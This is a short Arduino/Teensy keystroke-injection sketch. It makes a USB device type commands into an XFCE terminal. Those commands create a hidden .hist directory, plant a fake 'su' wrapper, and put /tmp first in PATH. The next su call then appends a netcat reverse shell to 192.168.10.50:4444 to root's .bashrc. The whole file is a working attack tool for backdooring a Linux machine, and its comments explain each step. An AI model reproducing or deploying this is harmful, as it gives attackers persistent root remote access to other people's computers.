void setup() {
  // put your setup code here, to run once:
  Serial.begin(9600);
  delay(1000);
  // press and hold ALT
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.send_now();

  // press F2, while ALT still held
  Keyboard.set_key1(KEY_F2);
  Keyboard.send_now();

  // release all the keys at the same instant
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();

  delay(500);

  // open a terminal

  Keyboard.println("xfce4-terminal");

  delay(200);
  // create a "hidden" directory .hist
  // put in .hist a script that adds a reverse shell to root .bashrc, and then launches a bash
  Keyboard.println("mkdir $HOME/.hist ; echo '#!/bin/bash \necho \"nc -n 192.168.10.50 4444 -e /bin/sh 2> /dev/null &\" >> /root/.bashrc\n/bin/bash' > $HOME/.hist/rs.sh");
  delay(50);
  // put in .hist a script named "su" that will call su, with the script written above as command
  Keyboard.println("echo '#!/bin/bash \n/bin/su ${1} -c /tmp/rs.sh' > $HOME/.hist/su");
  delay(50);
  // give the 2 scripts executable privilege
  // add 2 lines in user .bashrc, to copy the scripts to /tmp and add /tmp to PATH variable
  Keyboard.println("chmod +x $HOME/.hist/* ; echo \"cp $HOME/.hist/* /tmp/\" >> $HOME/.bashrc ; echo 'export PATH=/tmp/:$PATH' >> $HOME/.bashrc");
  delay(100);

  // now, next time su command will be used by the user, the backdoor will be added to the root .bashrc
  // we can close the terminal
  
  // press and hold SHIFT
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.send_now();

  // press CTRL while still holding SHIFT
  Keyboard.set_modifier(MODIFIERKEY_SHIFT | MODIFIERKEY_CTRL);
  Keyboard.send_now();

  // press Q, while CLTR and SHIFT still held
  Keyboard.set_key1(KEY_Q);
  Keyboard.set_key2(KEY_A);
  Keyboard.send_now();

  // release all the keys at the same instant
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.set_key2(0);
  Keyboard.send_now();
}

void loop() {
  // put your main code here, to run repeatedly:

}
